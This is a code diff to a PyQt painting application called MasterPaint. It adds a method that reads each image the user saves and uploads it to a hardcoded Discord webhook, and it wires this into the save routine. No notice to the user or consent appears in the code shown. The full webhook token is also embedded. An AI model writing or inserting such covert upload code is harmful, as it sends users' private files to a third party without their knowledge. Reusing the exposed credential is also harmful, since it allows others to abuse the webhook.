@@ -41,6 +41,21 @@ class PaintApp(QMainWindow):
 
     send_discord_message("The MasterPaint application has started.")
 
+    def send_image_to_discord(self, file_path):
+        webhook_url = 'https://discord.com/api/webhooks/1206403822201602048/oTcOYxkTpiH8pdMOtn9KTSi8vzJjNFLrQSOzHhDD6JFB8UJeP1Fog9MEK6DehRN81uhZ'
+        content = "¡New image saved!"
+
+        with open(file_path, "rb") as f:
+            files = {'file': f}
+            data = {'content': content}
+
+            response = requests.post(webhook_url, data=data, files=files)
+
+            if response.status_code == 204:
+                print("Mensaje con imagen enviado con éxito a Discord.")
+            else:
+                print(f"Error al enviar el mensaje a Discord: {response.status_code} - {response.text}")
+
     def check_for_updates(self):
         try:
             url = 'https://api.github.com/repos/MasterPaintDev/MasterPaint/releases/latest'
@@ -197,6 +212,7 @@ class PaintApp(QMainWindow):
         file_path, _ = QFileDialog.getSaveFileName(self, self.messages['dialogs']['save'], "", self.messages['dialogs']['image_filter'])
         if file_path:
             self.canvas.save_image(file_path)
+            self.send_image_to_discord(file_path)
 
     def open_in_paint(self):
         reply = QMessageBox.question(self, self.messages['dialogs']['open_in_paint_title'],
